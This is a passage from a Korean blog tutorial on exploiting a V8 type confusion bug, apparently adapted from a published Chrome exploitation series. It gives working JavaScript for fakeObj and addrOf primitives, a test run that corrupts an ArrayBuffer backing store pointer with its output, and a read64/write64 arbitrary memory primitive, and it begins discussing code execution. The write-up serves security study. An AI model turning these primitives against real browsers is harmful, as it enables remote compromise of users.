&#xC624;&#xD504;&#xC14B; 24&#xB97C; &#xC811;&#xADFC;&#xD558;&#xACE0;, &#xADF8;&#xACF3;&#xC5D0; &#xC778;&#xB77C;&#xC778;&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xB41C; <code>x</code> &#xD504;&#xB85C;&#xD37C;&#xD2F0; &#xAC12;&#xC744; &#xC77D;&#xAC70;&#xB098; &#xC4F0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; Type confusion&#xC73C;&#xB85C; &#xC778;&#xD574;, &#xC2E4;&#xC81C;&#xB85C;&#xB294; &#xC774; &#xC5F0;&#xC0B0;&#xC774; <code>p2</code>&#xC758; &#xAC1D;&#xCCB4; &#xC8FC;&#xC18C;&#xB97C; &#xC5ED;&#xCC38;&#xC870;&#xD558;&#xC5EC; &#xC624;&#xD504;&#xC14B; 24&#xB97C; &#xC811;&#xADFC;&#xD558;&#xAC8C; &#xB418;&#xACE0;, &#xADF8; &#xC704;&#xCE58;&#xC5D0; &#xC778;&#xB77C;&#xC778;&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xB41C; <code>y</code> &#xD504;&#xB85C;&#xD37C;&#xD2F0; &#xAC12;&#xC744; &#xC870;&#xC791;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xC6B0;&#xB9AC;&#xB294; <code>obj</code> &#xAC1D;&#xCCB4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xB798; &#xADF8;&#xB9BC;&#xC740; &#xC774;&#xB97C; &#xC2DC;&#xAC01;&#xC801;&#xC73C;&#xB85C; &#xB098;&#xD0C0;&#xB0B8; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="image.png" alt="&#xCD9C;&#xCC98;: [https://jhalon.github.io/chrome-browser-exploitation-3/](https://jhalon.github.io/chrome-browser-exploitation-3/)"></p><p>&#xCD9C;&#xCC98;: <a href="https://jhalon.github.io/chrome-browser-exploitation-3/">https://jhalon.github.io/chrome-browser-exploitation-3/</a></p><p>ArrayBuffer&#xC758; &#xBC31;&#xD0B9; &#xC2A4;&#xD1A0;&#xC5B4; &#xD3EC;&#xC778;&#xD130;&#xB294; &#xC624;&#xD504;&#xC14B; 32&#xC5D0; &#xC704;&#xCE58;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>x2</code>&#xC640; &#xAC19;&#xC740; &#xB610; &#xB2E4;&#xB978; &#xC778;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xBA74;, <code>fakeObj</code> &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xBC31;&#xD0B9; &#xC2A4;&#xD1A0;&#xC5B4; &#xD3EC;&#xC778;&#xD130;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xC758; &#xADF8;&#xB9BC;&#xC744; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="image%201.png" alt="image.png"></p><p>&#xC774;&#xC81C; ArrayBuffer&#xC758; Backing Store Pointer&#xB97C; &#xB36E;&#xC5B4;&#xC500;&#xC73C;&#xB85C;&#xC368; AAR/W primitive&#xB97C; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC5EC;&#xAE30;&#xC11C; &#xC57D;&#xAC04;&#xC758; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC00;&#xB839;, &#xC5EC;&#xB7EC; &#xBA54;&#xBAA8;&#xB9AC; &#xC704;&#xCE58;&#xC5D0;&#xC11C; &#xC77D;&#xAE30; &#xBC0F; &#xC4F0;&#xAE30;&#xB97C; &#xD574;&#xC57C; &#xD55C;&#xB2E4;&#xACE0; &#xAC00;&#xC815;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;. &#xC774; &#xACBD;&#xC6B0; &#xC6B0;&#xB9AC;&#xB294; &#xACC4;&#xC18D;&#xD574;&#xC11C; &#xBC84;&#xADF8;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xACE0; <code>fakeObj</code> &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xD1B5;&#xD574; &#xBC30;&#xC5F4; &#xBC84;&#xD37C;&#xC758; &#xBC31;&#xD0B9; &#xC2A4;&#xD1A0;&#xC5B4;&#xB97C; &#xB36E;&#xC5B4;&#xC368;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xB9E4;&#xC6B0; &#xBC88;&#xAC70;&#xB85C;&#xC6B4; &#xACFC;&#xC815;&#xC774;&#xBBC0;&#xB85C; &#xC880; &#xB354; &#xC720;&#xC6A9;&#xD55C; &#xAE30;&#xBC95;&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xC704;&#xD574;, Array Buffer &#xAC1D;&#xCCB4;&#xB97C; &#xD558;&#xB098;&#xAC00; &#xC544;&#xB2CC; <strong>&#xB450; &#xAC1C;</strong>&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; &#xCCAB; &#xBC88;&#xC9F8; Array Buffer&#xC758; &#xBC31;&#xD0B9; &#xC2A4;&#xD1A0;&#xC5B4; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC190;&#xC0C1;&#xC2DC;&#xCF1C; &#xB450; &#xBC88;&#xC9F8; &#xBC30;&#xC5F4; &#xBC84;&#xD37C; &#xAC1D;&#xCCB4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB3C4;&#xB85D; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xADF8; &#xB2E4;&#xC74C;, &#xCCAB; &#xBC88;&#xC9F8; Array Buffer&#xC758; <code>TypedArray</code> view&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xB2E4;&#xC12F; &#xBC88;&#xC9F8; &#xAC1D;&#xCCB4; &#xD504;&#xB85C;&#xD37C;&#xD2F0;(&#xB124; &#xBC88;&#xC9F8; &#xC778;&#xB371;&#xC2A4;, &#xC989; <code>view1[4]</code>)&#xC5D0; &#xAC12;&#xC744; &#xC368;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC740; &#xB450; &#xBC88;&#xC9F8; &#xBC30;&#xC5F4; &#xBC84;&#xD37C;&#xC758; &#xBC31;&#xD0B9; &#xC2A4;&#xD1A0;&#xC5B4; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB36E;&#xC5B4;&#xC50C;&#xC6B0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xB450; &#xBC88;&#xC9F8; &#xBC30;&#xC5F4; &#xBC84;&#xD37C;&#xC758; <code>TypedArray</code> view&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xC6D0;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC5D0; &#xC790;&#xC720;&#xB86D;&#xAC8C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xAC70;&#xB098; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC640; &#xAC19;&#xC774; &#xB450; &#xAC1C;&#xC758; &#xBC30;&#xC5F4; &#xBC84;&#xD37C;&#xB97C; &#xD568;&#xAED8; &#xC0AC;&#xC6A9;&#xD558;&#xBA74;, V8 &#xD799; &#xB0B4; &#xC784;&#xC758;&#xC758; &#xC704;&#xCE58;&#xC5D0; &#xB300;&#xD574; &#xBE60;&#xB974;&#xAC8C; &#xC77D;&#xACE0; &#xC4F8; &#xC218; &#xC788;&#xB294; &#xB610; &#xB2E4;&#xB978; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB798; &#xC608;&#xC2DC;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xC774; &#xAD6C;&#xC870;&#xB97C; &#xC124;&#xBA85;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image%202.png" alt="image.png"></p><h3 id="Coding"><a href="#Coding" class="headerlink" title="Coding)"></a>Coding)</h3><p>&#xCF54;&#xB4DC; &#xBD80;&#xBD84;&#xC744; &#xBD05;&#xC2DC;&#xB2E4;. &#xC55E;&#xC5D0;&#xC11C;&#xB294; &#xB36E;&#xC5B4;&#xC4F0;&#xB294; &#xAC12;&#xC744; &#xD558;&#xB4DC;&#xCF54;&#xB529;&#xD588;&#xB294;&#xB370;, &#xC774;&#xC81C;&#xB294; &#xC804;&#xB2EC; &#xBC1B;&#xC740; &#xC778;&#xC790;&#xB85C; &#xAC12;&#xC744; &#xC4F0;&#xB3C4;&#xB85D; &#xC218;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C;, <code>p1</code> &#xAC1D;&#xCCB4;&#xB97C; &#xB450; &#xAC1C;&#xC758; &#xC778;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xB97C; &#xAC00;&#xC9C4; &#xD615;&#xD0DC;&#xB85C; &#xC218;&#xC815;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xC774;&#xC720;&#xB294; &#xB450; &#xBC88;&#xC9F8; &#xC778;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xAC00; &#xBC30;&#xC5F4; &#xBC84;&#xD37C;&#xC758; &#xBC31;&#xD0B9; &#xC2A4;&#xD1A0;&#xC5B4; &#xD3EC;&#xC778;&#xD130;&#xC640; &#xACB9;&#xCE58;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>vuln</code> &#xD568;&#xC218; &#xC5ED;&#xC2DC; &#xB450; &#xBC88;&#xC9F8; &#xC778;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xC5EC; &#xBC31;&#xD0B9; &#xC2A4;&#xD1A0;&#xC5B4; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC218;&#xC815;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB9AC;&#xACE0; &#xC8FC;&#xC18C;&#xB098; &#xB370;&#xC774;&#xD130;&#xB97C; float &#xD0C0;&#xC785;&#xC73C;&#xB85C; &#xBC14;&#xAFB8;&#xAE30; &#xC704;&#xD574;&#xC11C; toNumber &#xD568;&#xC218;&#xB97C; &#xCD94;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; Type Confusion &#xC2DC; &#xBD80;&#xB3D9;&#xC18C;&#xC218;&#xAC12;&#xC744; &#xC8FC;&#xC18C;&#xAC12;&#xC73C;&#xB85C; &#xD574;&#xC11D;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xC644;&#xC131;&#xB41C; <code>fakeObj</code> &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">BigInt.prototype.toNumber = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toNumber</span>(<span class="hljs-params"></span>) </span>{    uint64View[<span class="hljs-number">0</span>] = <span class="hljs-built_in">this</span>;    <span class="hljs-keyword">return</span> floatView[<span class="hljs-number">0</span>];};<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params">obj, newValue</span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      // Write to Backing Store Pointer via Property x2</span><span class="hljs-string">      let orig = obj.p<span class="hljs-subst">${p1}</span>.x2;</span><span class="hljs-string">      obj.p<span class="hljs-subst">${p1}</span>.x2 = <span class="hljs-subst">${newValue.toNumber()}</span>;</span><span class="hljs-string">      return orig;</span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> pValues = [];    <span class="hljs-comment">// x2 Property Overlaps Backing Store Pointer for Array Buffer</span>    <span class="hljs-keyword">let</span> o = {<span class="hljs-attr">x1</span>: <span class="hljs-number">13.37</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">13.38</span>};    pValues[p1] = o;    pValues[p2] = obj;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-comment">// Force Map Check and Redundancy Elimination</span>        o.x2 = <span class="hljs-number">13.38</span>;        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.38</span>) {            <span class="hljs-keyword">return</span> res.toBigInt();        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] fakeObj Primitive Failed&quot;</span>}</code></pre><p>&#xC774;&#xC81C; <code>fakeObj</code> &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xC5D0;&#xC11C; &#xB450; &#xAC1C;&#xC758; &#xC778;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC774;&#xC720;&#xC640; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; <code>addrOf</code> &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C; &#xC5ED;&#xC2DC; &#xC218;&#xC815;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC218;&#xC815;&#xB41C; &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrOf</span>(<span class="hljs-params">obj</span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      // Trigger our type-confusion by accessing an out-of-bound property</span><span class="hljs-string">      // This will load p1 from our object thinking it&apos;s a Double, but instead</span><span class="hljs-string">      // due to overlap, it will load p2 which is an Object</span><span class="hljs-string">      return obj.p<span class="hljs-subst">${p1}</span>.x2;</span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> pValues = [];    <span class="hljs-comment">// x2 Property Overlaps Backing Store Pointer for Array Buffer</span>    pValues[p1] = {<span class="hljs-attr">x1</span>: <span class="hljs-number">13.37</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">13.38</span>};    pValues[p2] = {<span class="hljs-attr">y</span>: obj};    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {            <span class="hljs-comment">// Subtract 1n from address due to pointer tagging.</span>            <span class="hljs-keyword">return</span> res.toBigInt() - <span class="hljs-number">1n</span>;        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] AddrOf Primitive Failed&quot;</span>}</code></pre><hr><p>&#xC774;&#xC81C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC218;&#xC815;&#xD588;&#xC73C;&#xBBC0;&#xB85C;, &#xBC30;&#xC5F4; &#xBC84;&#xD37C;&#xC758; &#xBC31;&#xD0B9; &#xC2A4;&#xD1A0;&#xC5B4; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD14C;&#xC2A4;&#xD2B8;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6B0;&#xC120; 1024&#xBC14;&#xC774;&#xD2B8; &#xD06C;&#xAE30;&#xC758; &#xC0C8;&#xB85C;&#xC6B4; &#xBC30;&#xC5F4; &#xBC84;&#xD37C;&#xB97C; &#xB9CC;&#xB4E4;&#xACE0;, &#xADF8; &#xC8FC;&#xC18C;&#xB97C; leak&#xD55C; &#xB4A4; &#xBC31;&#xD0B9; &#xC2A4;&#xD1A0;&#xC5B4; &#xD3EC;&#xC778;&#xD130;&#xB97C; <code>0x41414141</code>&#xB85C; &#xB36E;&#xC5B4;&#xC50C;&#xC6CC; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCF54;&#xB4DC; &#xB0B4;&#xC5D0; <code>%DebugPrint</code>&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xC5EC; &#xC720;&#xCD9C;&#xB41C; &#xC8FC;&#xC18C;&#xAC00; &#xC2E4;&#xC81C; &#xBC30;&#xC5F4; &#xBC84;&#xD37C; &#xAC1D;&#xCCB4;&#xC758; &#xC8FC;&#xC18C;&#xC640; &#xC77C;&#xCE58;&#xD558;&#xB294;&#xC9C0;, &#xADF8;&#xB9AC;&#xACE0; &#xBC31;&#xD0B9; &#xC2A4;&#xD1A0;&#xC5B4; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xB36E;&#xC5B4;&#xC368;&#xC84C;&#xB294;&#xC9C0;&#xB97C; &#xAC80;&#xC99D;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC218;&#xC815;&#xB41C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC758; &#xB9C8;&#xC9C0;&#xB9C9; &#xBD80;&#xBD84;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">print(<span class="hljs-string">&quot;[+] Finding Overlapping Properties...&quot;</span>);findOverlappingProperties();print(<span class="hljs-string">`[+] Properties p<span class="hljs-subst">${p1}</span> and p<span class="hljs-subst">${p2}</span> overlap!`</span>);<span class="hljs-comment">// Create Array Buffer</span><span class="hljs-keyword">let</span> arrBuf1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);print(<span class="hljs-string">&quot;[+] Leaking ArrayBuffer Address...&quot;</span>);<span class="hljs-keyword">let</span> arrBuf1fAddr = addrOf(arrBuf1);print(<span class="hljs-string">`[+] ArrayBuffer Address: 0x<span class="hljs-subst">${arrBuf1fAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);%DebugPrint(arrBuf1)print(<span class="hljs-string">&quot;[+] Corrupting ArrayBuffer Backing Store Address...&quot;</span>)<span class="hljs-comment">// Overwrite Backing Store Pointer with 0x41414141</span><span class="hljs-keyword">let</span> ret = fakeObj(arrBuf1, <span class="hljs-number">0x41414141n</span>);print(<span class="hljs-string">`[+] Original Leaked Data: 0x<span class="hljs-subst">${ret.toString(<span class="hljs-number">16</span>)}</span>`</span>);%DebugPrint(arrBuf1)</code></pre><p>&#xC2E4;&#xD589; &#xACB0;&#xACFC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs prolog">[+] <span class="hljs-symbol">Finding</span> <span class="hljs-symbol">Overlapping</span> <span class="hljs-symbol">Properties</span>...[+] <span class="hljs-symbol">Properties</span> p15 and p11 overlap![+] <span class="hljs-symbol">Leaking</span> <span class="hljs-symbol">ArrayBuffer</span> <span class="hljs-symbol">Address</span>...[+] <span class="hljs-symbol">ArrayBuffer</span> <span class="hljs-symbol">Address</span>: <span class="hljs-number">0x2a164919360</span>...[+] <span class="hljs-symbol">Corrupting</span> <span class="hljs-symbol">ArrayBuffer</span> <span class="hljs-symbol">Backing</span> <span class="hljs-symbol">Store</span> <span class="hljs-symbol">Address</span>...[+] <span class="hljs-symbol">Original</span> <span class="hljs-symbol">Leaked</span> <span class="hljs-symbol">Data</span>: <span class="hljs-number">0x1aeda203210</span><span class="hljs-symbol">DebugPrint</span>: ... - backing_store: <span class="hljs-number">0000000041414141</span>...</code></pre><hr><p>&#xC774;&#xC81C; &#xBC31;&#xD0B9; &#xC2A4;&#xD1A0;&#xC5B4; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C;, &#xB450; &#xAC1C;&#xC758; ArrayBuffer&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xBA54;&#xBAA8;&#xB9AC; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30; &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xAD6C;&#xCD95;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs jsx"><span class="hljs-keyword">let</span> memory = {    read64(addr) {        view1[<span class="hljs-number">4</span>] = addr;        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);        <span class="hljs-keyword">return</span> view2[<span class="hljs-number">0</span>];    },    write64(addr, ptr) {        view1[<span class="hljs-number">4</span>] = addr;        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);        view2[<span class="hljs-number">0</span>] = ptr;    }};</code></pre><p>Type Confusion&#xC744; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xCC98;&#xC74C;&#xC5D0;&#xB294; Overlapping &#xB418;&#xB294; bug&#xB97C; &#xC774;&#xC6A9;&#xD574; Relative R/W&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xACE0; Array Buffer 2&#xAC1C;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xC774;&#xB97C; Arbitary Address R/W&#xB85C; &#xBC14;&#xAFC0; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; Code&#xB97C; Execution &#xD558;&#xB7EC; &#xAC00;&#xBCF4;&#xC2DC;&#xC8E0;!</p><h2 id="1-2-AAR-W-&#x2192;-RCE"><a href="#1-2-AAR-W-&#x2192;-RCE" class="headerlink" title="1.2 AAR/W &#x2192; RCE"></a>1.2 AAR/W &#x2192; RCE</h2><h3 id="Toward-Gaining-Code-Execution"><a href="#Toward-Gaining-Code-Execution" class="headerlink" title="Toward Gaining Code Execution"></a>Toward Gaining Code Execution</h3><p>AAR/W&#xB97C; &#xC5BB;&#xC5C8;&#xC73C;&#xB2C8; &#xC774;&#xC81C; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xBA74; &#xB418;&#xB294;&#xB370;, &#xC548;&#xD0C0;&#xAE5D;&#xAC8C;&#xB3C4;.. &#xB2E8;&#xC21C;&#xD788; V8 &#xD799; &#xC601;&#xC5ED;&#xC774;&#xB098; ArrayBuffer&#xC5D0; &#xC178;&#xCF54;&#xB4DC;&#xB97C; &#xC368; &#xB123;&#xACE0; &#xC2E4;&#xD589;&#xD560; &#xC218;&#xB294; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC65C;&#xB0D0;&#xD558;&#xBA74; DEP(Data Execution Prevention)&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xB300;&#xC548;&#xC73C;&#xB85C;&#xB294; JIT &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC744; &#xBAA9;&#xD45C;&#xB85C; &#xC0BC;&#xB294; &#xBC29;&#xBC95;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xCF54;&#xB4DC;&#xAC00; JIT &#xCEF4;&#xD30C;&#xC77C;&#xB420; &#xB54C;, &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB294; &#xAE30;&#xACC4;&#xC5B4; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xBA54;&#xBAA8;&#xB9AC; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xAE30;&#xB85D;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xC2E4;&#xD589;&#xD574;&#xC57C; &#xD558;&#xBBC0;&#xB85C; &#xBCF4;&#xD1B5; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC; &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xB294; RWX(Read-Write-Execute) &#xAD8C;&#xD55C;&#xC774; &#xBD80;&#xC5EC;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xB294; JIT &#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xD568;&#xC218;&#xC758; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC720;&#xCD9C;&#xD55C; &#xB4A4;, &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xC5D0; &#xC178;&#xCF54;&#xB4DC;&#xB97C; &#xB36E;&#xC5B4;&#xC4F0;&#xACE0; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xC545;&#xC131; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><em>&#xADF8;&#xB7EC;&#xB098;</em> 2018&#xB144; &#xC774;&#xD6C4; V8 &#xD300;&#xC740; <code>write_protect_code_memory</code> &#xBCF4;&#xD638; &#xAE30;&#xBC95;&#xC744; &#xB3C4;&#xC785;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xAE30;&#xB2A5;&#xC740; JIT &#xBA54;&#xBAA8;&#xB9AC; &#xD398;&#xC774;&#xC9C0;&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xC2E4;&#xD589; &#xC2DC;&#xC810;&#xC5D0;&#xB294; RX(Read-Execute) &#xB85C;, &#xC4F0;&#xAE30; &#xC2DC;&#xC810;&#xC5D0;&#xB294; RW(Read-Write) &#xB85C; &#xC804;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xB2E8;&#xC21C;&#xD788; RWX &#xBA54;&#xBAA8;&#xB9AC;&#xB85C; &#xCDE8;&#xAE09;&#xD558;&#xACE0; &#xACF5;&#xACA9;&#xD558;&#xB294; &#xAC83;&#xC774; &#xBD88;&#xAC00;&#xB2A5;&#xD574;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xB2E4;&#xB978; pwnable &#xBB38;&#xC81C;&#xCC98;&#xB7FC; &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xB300;&#xD45C;&#xC801;&#xC778; &#xBC29;&#xBC95;&#xC740; ROP(Return Oriented Programming) &#xAE30;&#xBC95;&#xC744; &#xBF51;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. ROP&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xAC00;&#xC0C1; &#xD568;&#xC218; &#xD14C;&#xC774;&#xBE14;(vtable)&#xC774;&#xB098; JIT &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;, &#xC2A4;&#xD0DD;&#xC744; &#xC870;&#xC791;&#xD558;&#xC5EC; Code Execution&#xC744; &#xD560; &#xC218; 